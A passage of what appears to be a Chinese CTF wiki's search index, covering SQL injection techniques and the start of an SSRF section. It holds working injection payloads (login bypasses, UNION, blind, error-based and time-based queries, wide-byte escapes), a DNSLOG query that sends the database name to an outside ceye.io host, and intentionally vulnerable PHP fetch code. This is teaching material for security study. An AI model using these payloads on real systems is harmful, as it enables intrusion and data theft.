\u7684\u8868 SELECT table_name FROM information_schema . columns WHERE column_name LIKE '%user%' ; \u7ed5\u8fc7\u5f15\u53f7\u9650\u5236 \u00b6 -- hex \u7f16\u7801 SELECT * FROM Users WHERE username = 0 x61646D696E -- char() \u51fd\u6570 SELECT * FROM Users WHERE username = CHAR ( 97 , 100 , 109 , 105 , 110 ) \u7ed5\u8fc7\u5b57\u7b26\u4e32\u9ed1\u540d\u5355 \u00b6 SELECT 'a' 'd' 'mi' 'n' ; SELECT CONCAT ( 'a' , 'd' , 'm' , 'i' , 'n' ); SELECT CONCAT_WS ( '' , 'a' , 'd' , 'm' , 'i' , 'n' ); SELECT GROUP_CONCAT ( 'a' , 'd' , 'm' , 'i' , 'n' ); \u4f7f\u7528 CONCAT() \u65f6\uff0c\u4efb\u4f55\u4e2a\u53c2\u6570\u4e3a null\uff0c\u5c06\u8fd4\u56de null\uff0c\u63a8\u8350\u4f7f\u7528 CONCAT_WS() \u3002 CONCAT_WS() \u51fd\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u7528\u54ea\u4e2a\u5b57\u7b26\u95f4\u9694\u6240\u67e5\u8be2\u7684\u7ed3\u679c\u3002 \u6761\u4ef6\u8bed\u53e5 \u00b6 CASE , IF() , IFNULL() , NULLIF() . SELECT IF ( 1 = 1 , true , false ); SELECT CASE WHEN 1 = 1 THEN true ELSE false END ; \u5ef6\u65f6\u51fd\u6570 \u00b6 SLEEP() , BENCHMARK() . ' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(' true ')), false)) - ' order by \u540e\u7684\u6ce8\u5165 \u00b6 order by \u7531\u4e8e\u662f\u6392\u5e8f\u8bed\u53e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u5229\u7528\u6761\u4ef6\u8bed\u53e5\u505a\u5224\u65ad\uff0c\u6839\u636e\u8fd4\u56de\u7684\u6392\u5e8f\u7ed3\u679c\u4e0d\u540c\u5224\u65ad\u6761\u4ef6\u7684\u771f\u5047\u3002\u4e00\u822c\u5e26\u6709 order \u6216\u8005 order by \u7684\u53d8\u91cf\u5f88\u53ef\u80fd\u662f\u8fd9\u79cd\u6ce8\u5165\uff0c\u5728\u77e5\u9053\u4e00\u4e2a\u5b57\u6bb5\u7684\u65f6\u5019\u53ef\u4ee5\u91c7\u7528\u5982\u4e0b\u65b9\u5f0f\u6ce8\u5165\uff1a \u539f\u59cb\u94fe\u63a5\uff1a http://www.test.com/list.php?order=vote \u6839\u636e vote \u5b57\u6bb5\u6392\u5e8f\u3002\u627e\u5230\u6295\u7968\u6570\u6700\u5927\u7684\u7968\u6570 num \u7136\u540e\u6784\u9020\u4ee5\u4e0b\u94fe\u63a5\uff1a http://www.test.com/list.php?order=abs(vote-(length(user())>0)*num)+asc \u770b\u6392\u5e8f\u662f\u5426\u53d8\u5316\u3002\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u4e0d\u9700\u8981\u77e5\u9053\u4efb\u4f55\u5b57\u6bb5\u4fe1\u606f\uff0c\u4f7f\u7528 rand \u51fd\u6570\uff1a http://www.test.com/list.php?order=rand(true) http://www.test.com/list.php?order=rand(false) \u4ee5\u4e0a\u4e24\u4e2a\u4f1a\u8fd4\u56de\u4e0d\u540c\u7684\u6392\u5e8f\uff0c\u5224\u65ad\u8868\u540d\u4e2d\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u5426\u5c0f\u4e8e 128 \u7684\u8bed\u53e5\u5982\u4e0b\uff1a http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128)) \u5bbd\u5b57\u8282\u6ce8\u5165 \u00b6 \u56fd\u5185\u6700\u5e38\u4f7f\u7528\u7684 GBK \u7f16\u7801\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e3b\u8981\u662f\u7ed5\u8fc7 addslashes \u7b49\u5bf9\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u79fb\u7684\u7ed5\u8fc7\u3002\u53cd\u659c\u6760 \\ \u7684\u5341\u516d\u8fdb\u5236\u4e3a %5c \uff0c\u5728\u4f60\u8f93\u5165 %bf%27 \u65f6\uff0c\u51fd\u6570\u9047\u5230\u5355\u5f15\u53f7\u81ea\u52a8\u8f6c\u79fb\u52a0\u5165 \\ \uff0c\u6b64\u65f6\u53d8\u4e3a %bf%5c%27 \uff0c %bf%5c \u5728 GBK \u4e2d\u53d8\u4e3a\u4e00\u4e2a\u5bbd\u5b57\u7b26\u300c\u7e17\u300d\u3002 %bf \u90a3\u4e2a\u4f4d\u7f6e\u53ef\u4ee5\u662f %81-%fe \u4e2d\u95f4\u7684\u4efb\u4f55\u5b57\u7b26\u3002\u4e0d\u6b62\u5728 SQL \u6ce8\u5165\u4e2d\uff0c\u5bbd\u5b57\u7b26\u6ce8\u5165\u5728\u5f88\u591a\u5730\u65b9\u90fd\u53ef\u4ee5\u5e94\u7528\u3002 DNSLOG\u6ce8\u5165 \u00b6 DNS\u5728\u89e3\u6790\u7684\u65f6\u5019\u4f1a\u7559\u4e0b\u65e5\u5fd7\uff0c\u901a\u8fc7\u8bfb\u53d6\u591a\u7ea7\u57df\u540d\u7684\u89e3\u6790\u65e5\u5fd7\uff0c\u6765\u83b7\u53d6\u4fe1\u606f\u3002\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u628a\u4fe1\u606f\u653e\u5728\u9ad8\u7ea7\u57df\u540d\u4e2d\uff0c\u4f20\u9012\u5230\u81ea\u5df1\u8fd9\uff0c\u7136\u540e\u8bfb\u53d6\u65e5\u5fd7\uff0c\u83b7\u53d6\u4fe1\u606f\u3002 dnslog\u5e73\u53f0\uff1a http://ceye.io/ mysql> use security; Database changed mysql> select load_file('\\\\\\\\test.xxx.ceye.io\\\\abc'); +-------------------------------------------+ | load_file('\\\\\\\\test.xxx.ceye.io\\\\abc') | +-------------------------------------------+ | NULL | +-------------------------------------------+ 1 row in set (22.05 sec) mysql> select load_file(concat('\\\\\\\\',(select database()),'.xxx.ceye.io\\\\abc')); +----------------------------------------------------------------------+ | load_file(concat('\\\\\\\\',(select database()),'.xxx.ceye.io\\\\abc')) | +----------------------------------------------------------------------+ | NULL | +----------------------------------------------------------------------+ 1 row in set (0.00 sec) \u53c2\u8003\u8d44\u6599 \u00b6 SQL \u6ce8\u5165\u901f\u67e5\u8868 MySQL \u6ce8\u5165\u6280\u5de7 MySQL \u6ce8\u5165\u79d1\u666e MySQL \u6ce8\u5165\u603b\u7ed3 \u300aSQL \u6ce8\u5165\u653b\u51fb\u4e0e\u9632\u5fa1\u300b","title":"SQL \u6ce8\u5165"},{"location":"web/sqli/#sql","text":"","title":"SQL \u6ce8\u5165"},{"location":"web/sqli/#_1","text":"SQL \u6ce8\u5165\u662f\u4e00\u79cd\u5c06 SQL \u4ee3\u7801\u63d2\u5165\u6216\u6dfb\u52a0\u5230\u5e94\u7528\uff08\u7528\u6237\uff09\u7684\u8f93\u5165\u53c2\u6570\u4e2d\uff0c\u4e4b\u540e\u518d\u5c06\u8fd9\u4e9b\u53c2\u6570\u4f20\u9012\u7ed9\u540e\u53f0\u7684 SQL \u670d\u52a1\u5668\u52a0\u4ee5\u89e3\u6790\u5e76\u6267\u884c\u7684\u653b\u51fb\u3002 \u653b\u51fb\u8005\u80fd\u591f\u4fee\u6539 SQL \u8bed\u53e5\uff0c\u8be5\u8fdb\u7a0b\u5c06\u4e0e\u6267\u884c\u547d\u4ee4\u7684\u7ec4\u4ef6\uff08\u5982\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u5e94\u7528\u670d\u52a1\u5668\u6216 WEB \u670d\u52a1\u5668\uff09\u62e5\u6709\u76f8\u540c\u7684\u6743\u9650\u3002 \u5982\u679c WEB \u5e94\u7528\u5f00\u53d1\u4eba\u5458\u65e0\u6cd5\u786e\u4fdd\u5728\u5c06\u4ece WEB \u8868\u5355\u3001cookie\u3001\u8f93\u5165\u53c2\u6570\u7b49\u6536\u5230\u7684\u503c\u4f20\u9012\u7ed9 SQL \u67e5\u8be2\uff08\u8be5\u67e5\u8be2\u5728\u6570\u636e\u5e93\u670d\u52a1\u5668\u4e0a\u6267\u884c\uff09\u4e4b\u524d\u5df2\u7ecf\u5bf9\u5176\u8fdb\u884c\u8fc7\u9a8c\u8bc1\uff0c\u901a\u5e38\u5c31\u4f1a\u51fa\u73b0 SQL \u6ce8\u5165\u6f0f\u6d1e\u3002","title":"\u57fa\u672c\u6982\u5ff5"},{"location":"web/sqli/#_2","text":"Burp Suite\uff1a Burp Suite \u4f7f\u7528\u4ecb\u7ecd Tamper Data (Firefox addon) HackBar (Firefox addon) sqlmap\uff1a sqlmap \u7528\u6237\u624b\u518c","title":"\u5e38\u7528\u5de5\u5177"},{"location":"web/sqli/#_3","text":"user() \uff1a\u5f53\u524d\u6570\u636e\u5e93\u7528\u6237 database() \uff1a\u5f53\u524d\u6570\u636e\u5e93\u540d version() \uff1a\u5f53\u524d\u4f7f\u7528\u7684\u6570\u636e\u5e93\u7248\u672c @@datadir \uff1a\u6570\u636e\u5e93\u5b58\u50a8\u6570\u636e\u8def\u5f84 concat() \uff1a\u8054\u5408\u6570\u636e\uff0c\u7528\u4e8e\u8054\u5408\u4e24\u6761\u6570\u636e\u7ed3\u679c\u3002\u5982 concat(username,0x3a,password) group_concat() \uff1a\u548c concat() \u7c7b\u4f3c\uff0c\u5982 group_concat(DISTINCT+user,0x3a,password) \uff0c\u7528\u4e8e\u628a\u591a\u6761\u6570\u636e\u4e00\u6b21\u6ce8\u5165\u51fa\u6765 concat_ws() \uff1a\u7528\u6cd5\u7c7b\u4f3c hex() \u548c unhex() \uff1a\u7528\u4e8e hex \u7f16\u7801\u89e3\u7801 load_file() \uff1a\u4ee5\u6587\u672c\u65b9\u5f0f\u8bfb\u53d6\u6587\u4ef6\uff0c\u5728 Windows \u4e2d\uff0c\u8def\u5f84\u8bbe\u7f6e\u4e3a \\\\ select xxoo into outfile '\u8def\u5f84' \uff1a\u6743\u9650\u8f83\u9ad8\u65f6\u53ef\u76f4\u63a5\u5199\u6587\u4ef6","title":"\u6ce8\u5165\u5e38\u89c1\u53c2\u6570"},{"location":"web/sqli/#_4","text":"","title":"\u8bed\u6cd5\u53c2\u8003\u4e0e\u5c0f\u6280\u5de7"},{"location":"web/sqli/#_5","text":"-- DROP sampletable ; -- # DROP sampletable ; #","title":"\u884c\u95f4\u6ce8\u91ca"},{"location":"web/sqli/#_6","text":"/*\u6ce8\u91ca\u5185\u5bb9*/ DROP /*comment*/ sampletable ` DR /**/ OP /*\u7ed5\u8fc7\u8fc7\u6ee4*/ sampletable ` SELECT /*\u66ff\u6362\u7a7a\u683c*/ password /**/ FROM /**/ Members /*! MYSQL\u4e13\u5c5e */ SELECT /*!32302 1/0, */ 1 FROM tablename","title":"\u884c\u5185\u6ce8\u91ca"},{"location":"web/sqli/#_7","text":"ASCII() \uff1a\u8fd4\u56de\u5b57\u7b26\u7684 ASCII \u7801\u503c CHAR() \uff1a\u628a\u6574\u6570\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5b57\u7b26","title":"\u5b57\u7b26\u4e32\u7f16\u7801"},{"location":"web/sqli/#_8","text":"admin' -- admin' # admin'/* ' or 1=1-- ' or 1=1# ' or 1=1/* ') or '1'='1-- ') or ('1'='1-- \u4ee5\u4e0d\u540c\u7684\u7528\u6237\u767b\u9646 ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--","title":"\u540e\u53f0\u4e07\u80fd\u5bc6\u7801"},{"location":"web/sqli/#_9","text":"","title":"\u6ce8\u5165\u8bed\u53e5\u5907\u5fd8"},{"location":"web/sqli/#_10","text":"SELECT database (); SELECT schema_name FROM information_schema . schemata ;","title":"\u6570\u636e\u5e93\u540d"},{"location":"web/sqli/#_11","text":"union \u67e5\u8be2 --MySQL 4\u7248\u672c\u65f6\u7528version=9\uff0cMySQL 5\u7248\u672c\u65f6\u7528version=10 UNION SELECT GROUP_CONCAT ( table_name ) FROM information_schema . tables WHERE version = 10 ; /* \u5217\u51fa\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u7684\u8868 */ UNION SELECT TABLE_NAME FROM information_schema . tables WHERE TABLE_SCHEMA = database (); /* \u5217\u51fa\u6240\u6709\u7528\u6237\u81ea\u5b9a\u4e49\u6570\u636e\u5e93\u4e2d\u7684\u8868 */ SELECT table_schema , table_name FROM information_schema . tables WHERE table_schema != 'information_schema' AND table_schema != 'mysql' ; \u76f2\u6ce8 AND SELECT SUBSTR ( table_name , 1 , 1 ) FROM information_schema . tables > 'A' \u62a5\u9519 AND ( SELECT COUNT ( * ) FROM ( SELECT 1 UNION SELECT null UNION SELECT ! 1 ) x GROUP BY CONCAT (( SELECT table_name FROM information_schema . tables LIMIT 1 ), FLOOR ( RAND ( 0 ) * 2 ))) ( @ : = 1 ) ||@ GROUP BY CONCAT (( SELECT table_name FROM information_schema . tables LIMIT 1 ), !@ ) HAVING @|| MIN ( @ : = 0 ); AND ExtractValue ( 1 , CONCAT ( 0 x5c , ( SELECT table_name FROM information_schema . tables LIMIT 1 ))); -- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f\u3002","title":"\u8868\u540d"},{"location":"web/sqli/#_12","text":"union \u67e5\u8be2 UNION SELECT GROUP_CONCAT ( column_name ) FROM information_schema . columns WHERE table_name = 'tablename' \u76f2\u6ce8 AND SELECT SUBSTR ( column_name , 1 , 1 ) FROM information_schema . columns > 'A' \u62a5\u9519 -- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f AND ( 1 , 2 , 3 ) = ( SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1 , 2 , 3 LIMIT 1 ) -- MySQL 5.1\u7248\u672c\u4fee\u590d\u4e86 AND ( SELECT COUNT ( * ) FROM ( SELECT 1 UNION SELECT null UNION SELECT ! 1 ) x GROUP BY CONCAT (( SELECT column_name FROM information_schema . columns LIMIT 1 ), FLOOR ( RAND ( 0 ) * 2 ))) ( @ : = 1 ) ||@ GROUP BY CONCAT (( SELECT column_name FROM information_schema . columns LIMIT 1 ), !@ ) HAVING @|| MIN ( @ : = 0 ); AND ExtractValue ( 1 , CONCAT ( 0 x5c , ( SELECT column_name FROM information_schema . columns LIMIT 1 ))); \u5229\u7528 PROCEDURE ANALYSE() -- \u8fd9\u4e2a\u9700\u8981 web \u5c55\u793a\u9875\u9762\u6709\u4f60\u6240\u6ce8\u5165\u67e5\u8be2\u7684\u4e00\u4e2a\u5b57\u6bb5 -- \u83b7\u5f97\u7b2c\u4e00\u4e2a\u6bb5\u540d SELECT username , permission FROM Users WHERE id = 1 ; 1 PROCEDURE ANALYSE () -- \u83b7\u5f97\u7b2c\u4e8c\u4e2a\u6bb5\u540d 1 LIMIT 1 , 1 PROCEDURE ANALYSE () -- \u83b7\u5f97\u7b2c\u4e09\u4e2a\u6bb5\u540d 1 LIMIT 2 , 1 PROCEDURE ANALYSE ()","title":"\u5217\u540d"},{"location":"web/sqli/#_13","text":"-- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e3a username \u7684\u8868 SELECT table_name FROM information_schema . columns WHERE column_name = 'username' ; -- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e2d\u5305\u542b username \u7684\u8868 SELECT table_name FROM information_schema . columns WHERE column_name LIKE '%user%' ;","title":"\u6839\u636e\u5217\u540d\u67e5\u8be2\u6240\u5728\u7684\u8868"},{"location":"web/sqli/#_14","text":"-- hex \u7f16\u7801 SELECT * FROM Users WHERE username = 0 x61646D696E -- char() \u51fd\u6570 SELECT * FROM Users WHERE username = CHAR ( 97 , 100 , 109 , 105 , 110 )","title":"\u7ed5\u8fc7\u5f15\u53f7\u9650\u5236"},{"location":"web/sqli/#_15","text":"SELECT 'a' 'd' 'mi' 'n' ; SELECT CONCAT ( 'a' , 'd' , 'm' , 'i' , 'n' ); SELECT CONCAT_WS ( '' , 'a' , 'd' , 'm' , 'i' , 'n' ); SELECT GROUP_CONCAT ( 'a' , 'd' , 'm' , 'i' , 'n' ); \u4f7f\u7528 CONCAT() \u65f6\uff0c\u4efb\u4f55\u4e2a\u53c2\u6570\u4e3a null\uff0c\u5c06\u8fd4\u56de null\uff0c\u63a8\u8350\u4f7f\u7528 CONCAT_WS() \u3002 CONCAT_WS() \u51fd\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u7528\u54ea\u4e2a\u5b57\u7b26\u95f4\u9694\u6240\u67e5\u8be2\u7684\u7ed3\u679c\u3002","title":"\u7ed5\u8fc7\u5b57\u7b26\u4e32\u9ed1\u540d\u5355"},{"location":"web/sqli/#_16","text":"CASE , IF() , IFNULL() , NULLIF() . SELECT IF ( 1 = 1 , true , false ); SELECT CASE WHEN 1 = 1 THEN true ELSE false END ;","title":"\u6761\u4ef6\u8bed\u53e5"},{"location":"web/sqli/#_17","text":"SLEEP() , BENCHMARK() . ' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(' true ')), false)) - '","title":"\u5ef6\u65f6\u51fd\u6570"},{"location":"web/sqli/#order-by","text":"order by \u7531\u4e8e\u662f\u6392\u5e8f\u8bed\u53e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u5229\u7528\u6761\u4ef6\u8bed\u53e5\u505a\u5224\u65ad\uff0c\u6839\u636e\u8fd4\u56de\u7684\u6392\u5e8f\u7ed3\u679c\u4e0d\u540c\u5224\u65ad\u6761\u4ef6\u7684\u771f\u5047\u3002\u4e00\u822c\u5e26\u6709 order \u6216\u8005 order by \u7684\u53d8\u91cf\u5f88\u53ef\u80fd\u662f\u8fd9\u79cd\u6ce8\u5165\uff0c\u5728\u77e5\u9053\u4e00\u4e2a\u5b57\u6bb5\u7684\u65f6\u5019\u53ef\u4ee5\u91c7\u7528\u5982\u4e0b\u65b9\u5f0f\u6ce8\u5165\uff1a \u539f\u59cb\u94fe\u63a5\uff1a http://www.test.com/list.php?order=vote \u6839\u636e vote \u5b57\u6bb5\u6392\u5e8f\u3002\u627e\u5230\u6295\u7968\u6570\u6700\u5927\u7684\u7968\u6570 num \u7136\u540e\u6784\u9020\u4ee5\u4e0b\u94fe\u63a5\uff1a http://www.test.com/list.php?order=abs(vote-(length(user())>0)*num)+asc \u770b\u6392\u5e8f\u662f\u5426\u53d8\u5316\u3002\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u4e0d\u9700\u8981\u77e5\u9053\u4efb\u4f55\u5b57\u6bb5\u4fe1\u606f\uff0c\u4f7f\u7528 rand \u51fd\u6570\uff1a http://www.test.com/list.php?order=rand(true) http://www.test.com/list.php?order=rand(false) \u4ee5\u4e0a\u4e24\u4e2a\u4f1a\u8fd4\u56de\u4e0d\u540c\u7684\u6392\u5e8f\uff0c\u5224\u65ad\u8868\u540d\u4e2d\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u5426\u5c0f\u4e8e 128 \u7684\u8bed\u53e5\u5982\u4e0b\uff1a http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128))","title":"order by \u540e\u7684\u6ce8\u5165"},{"location":"web/sqli/#_18","text":"\u56fd\u5185\u6700\u5e38\u4f7f\u7528\u7684 GBK \u7f16\u7801\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e3b\u8981\u662f\u7ed5\u8fc7 addslashes \u7b49\u5bf9\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u79fb\u7684\u7ed5\u8fc7\u3002\u53cd\u659c\u6760 \\ \u7684\u5341\u516d\u8fdb\u5236\u4e3a %5c \uff0c\u5728\u4f60\u8f93\u5165 %bf%27 \u65f6\uff0c\u51fd\u6570\u9047\u5230\u5355\u5f15\u53f7\u81ea\u52a8\u8f6c\u79fb\u52a0\u5165 \\ \uff0c\u6b64\u65f6\u53d8\u4e3a %bf%5c%27 \uff0c %bf%5c \u5728 GBK \u4e2d\u53d8\u4e3a\u4e00\u4e2a\u5bbd\u5b57\u7b26\u300c\u7e17\u300d\u3002 %bf \u90a3\u4e2a\u4f4d\u7f6e\u53ef\u4ee5\u662f %81-%fe \u4e2d\u95f4\u7684\u4efb\u4f55\u5b57\u7b26\u3002\u4e0d\u6b62\u5728 SQL \u6ce8\u5165\u4e2d\uff0c\u5bbd\u5b57\u7b26\u6ce8\u5165\u5728\u5f88\u591a\u5730\u65b9\u90fd\u53ef\u4ee5\u5e94\u7528\u3002","title":"\u5bbd\u5b57\u8282\u6ce8\u5165"},{"location":"web/sqli/#dnslog","text":"DNS\u5728\u89e3\u6790\u7684\u65f6\u5019\u4f1a\u7559\u4e0b\u65e5\u5fd7\uff0c\u901a\u8fc7\u8bfb\u53d6\u591a\u7ea7\u57df\u540d\u7684\u89e3\u6790\u65e5\u5fd7\uff0c\u6765\u83b7\u53d6\u4fe1\u606f\u3002\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u628a\u4fe1\u606f\u653e\u5728\u9ad8\u7ea7\u57df\u540d\u4e2d\uff0c\u4f20\u9012\u5230\u81ea\u5df1\u8fd9\uff0c\u7136\u540e\u8bfb\u53d6\u65e5\u5fd7\uff0c\u83b7\u53d6\u4fe1\u606f\u3002 dnslog\u5e73\u53f0\uff1a http://ceye.io/ mysql> use security; Database changed mysql> select load_file('\\\\\\\\test.xxx.ceye.io\\\\abc'); +-------------------------------------------+ | load_file('\\\\\\\\test.xxx.ceye.io\\\\abc') | +-------------------------------------------+ | NULL | +-------------------------------------------+ 1 row in set (22.05 sec) mysql> select load_file(concat('\\\\\\\\',(select database()),'.xxx.ceye.io\\\\abc')); +----------------------------------------------------------------------+ | load_file(concat('\\\\\\\\',(select database()),'.xxx.ceye.io\\\\abc')) | +----------------------------------------------------------------------+ | NULL | +----------------------------------------------------------------------+ 1 row in set (0.00 sec)","title":"DNSLOG\u6ce8\u5165"},{"location":"web/sqli/#_19","text":"SQL \u6ce8\u5165\u901f\u67e5\u8868 MySQL \u6ce8\u5165\u6280\u5de7 MySQL \u6ce8\u5165\u79d1\u666e MySQL \u6ce8\u5165\u603b\u7ed3 \u300aSQL \u6ce8\u5165\u653b\u51fb\u4e0e\u9632\u5fa1\u300b","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/ssrf/","text":"SSRF \u00b6 SSRF \u7b80\u4ecb \u00b6 SSRF\uff0cServer-Side Request Forgery\uff0c\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u5668\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002 \u6f0f\u6d1e\u5f62\u6210\u7684\u539f\u56e0\u5927\u591a\u662f\u56e0\u4e3a\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u4f5c\u8fc7\u6ee4\u548c\u9650\u5236\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528 SSRF \u5b9e\u73b0\u7684\u653b\u51fb\u4e3b\u8981\u6709 5 \u79cd\uff1a \u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684 banner \u4fe1\u606f \u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09 \u5bf9\u5185\u7f51 WEB \u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0 \u653b\u51fb\u5185\u5916\u7f51\u7684 web \u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528 GET \u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982 Struts2\uff0csqli \u7b49\uff09 \u5229\u7528 file \u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49 SSRF \u6f0f\u6d1e\u51fa\u73b0\u7684\u573a\u666f \u00b6 \u80fd\u591f\u5bf9\u5916\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\u7684\u5730\u65b9\uff0c\u5c31\u53ef\u80fd\u5b58\u5728 SSRF \u6f0f\u6d1e \u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u8bf7\u6c42\u8d44\u6e90\uff08Upload from URL\uff0cImport & Export RSS Feed\uff09 \u6570\u636e\u5e93\u5185\u7f6e\u529f\u80fd\uff08Oracle\u3001MongoDB\u3001MSSQL\u3001Postgres\u3001CouchDB\uff09 Webmail \u6536\u53d6\u5176\u4ed6\u90ae\u7bb1\u90ae\u4ef6\uff08POP3\u3001IMAP\u3001SMTP\uff09 \u6587\u4ef6\u5904\u7406\u3001\u7f16\u7801\u5904\u7406\u3001\u5c5e\u6027\u4fe1\u606f\u5904\u7406\uff08ffmpeg\u3001ImageMagic\u3001DOCX\u3001PDF\u3001XML\uff09 \u5e38\u7528\u7684\u540e\u7aef\u5b9e\u73b0 \u00b6 file_get_contents <?php if ( isset ( $_POST [ 'url' ])) { $content = file_get_contents ( $_POST [ 'url' ]); $filename = './images/' . rand () . ';img1.jpg' ; file_put_contents ( $filename , $content ); echo $_POST [ 'url' ]; $img = \"<img src= \\\" \" . $filename . \" \\\" />\" ; } echo $img ; ?> \u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528 file_get_contents \u51fd\u6570\u4ece\u7528\u6237\u6307\u5b9a\u7684 URL \u83b7\u53d6\u56fe\u7247\u3002\u7136\u540e\u628a\u5b83\u7528\u4e00\u4e2a\u968f\u673a\u6587\u4ef6\u540d\u4fdd\u5b58\u5728\u786c\u76d8\u4e0a\uff0c\u5e76\u5c55\u793a\u7ed9\u7528\u6237\u3002 fsockopen() <?php function GetFile ( $host , $port , $link ) { $fp = fsockopen ( $host , intval ( $port ), $errno , $errstr , 30 ); if ( ! $fp ) { echo \" $errstr (error number $errno ) \\n \" ; } else { $out = \"GET $link HTTP/1.1 \\r\\n \" ; $out .= \"Host: $host\\r\\n \" ; $out .= \"Connection: Close \\r\\n\\r\\n \" ; $out .= \" \\r\\n \" ; fwrite ( $fp , $out ); $contents = '' ; while ( ! feof ( $fp )) { $contents .= fgets ( $fp , 1024 ); } fclose ( $fp ); return $contents ; } } ?> \u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528 fsockopen \u51fd\u6570\u5b9e\u73b0\u83b7\u53d6\u7528\u6237\u5236\u5b9a URL \u7684\u6570\u636e\uff08\u6587\u4ef6\u6216\u8005 HTML\uff09\u3002\u8fd9\u4e2a\u51fd\u6570\u4f1a\u4f7f\u7528 socket \u8ddf\u670d\u52a1\u5668\u5efa\u7acb TCP \u8fde\u63a5\uff0c\u4f20\u8f93\u539f\u59cb\u6570\u636e\u3002 curl_exec() <?php if ( isset ( $_POST [ 'url' ])) { $link = $_POST [ 'url' ]; $curlobj = curl_init (); curl_setopt ( $curlobj , CURLOPT_POST , 0 ); curl_setopt ( $curlobj , CURLOPT_URL , $link ); curl_setopt ( $curlobj , CURLOPT_RETURNTRANSFER , 1 ); $result = curl_exec ( $curlobj ); curl_close ( $curlobj ); $filename = './curled/' . rand () . '.txt' ; file_put_contents ( $filename , $result ); echo $result ; } ?> \u4f7f\u7528 curl \u83b7\u53d6\u6570\u636e\u3002 \u963b\u788d SSRF \u6f0f\u6d1e\u5229\u7528\u7684\u573a\u666f \u00b6 \u670d\u52a1\u5668\u5f00\u542f OpenSSL \u65e0\u6cd5\u8fdb\u884c\u4ea4\u4e92\u5229\u7528 \u670d\u52a1\u7aef\u9700\u8981\u9274\u6743\uff08Cookies & User\uff1aPass\uff09\u4e0d\u80fd\u5b8c\u7f8e\u5229\u7528 \u9650\u5236\u8bf7\u6c42\u7684\u7aef\u53e3\u4e3ahttp\u5e38\u7528\u7684\u7aef\u53e3\uff0c\u6bd4\u5982\uff0c80,443,8080,8090\u3002 \u7981\u7528\u4e0d\u9700\u8981\u7684\u534f\u8bae\u3002\u4ec5\u4ec5\u5141\u8bb8http\u548chttps\u8bf7\u6c42\u3002\u53ef\u4ee5\u9632\u6b62\u7c7b\u4f3c\u4e8efile:///,gopher://,ftp:// \u7b49\u5f15\u8d77\u7684\u95ee\u9898\u3002 \u7edf\u4e00\u9519\u8bef\u4fe1\u606f\uff0c\u907f\u514d\u7528\u6237\u53ef\u4ee5\u6839\u636e\u9519\u8bef\u4fe1\u606f\u6765\u5224\u65ad\u8fdc\u7aef\u670d\u52a1\u5668\u7684\u7aef\u53e3\u72b6\u6001\u3002 \u5229\u7528 SSRF \u8fdb\u884c\u7aef\u53e3\u626b\u63cf \u00b6 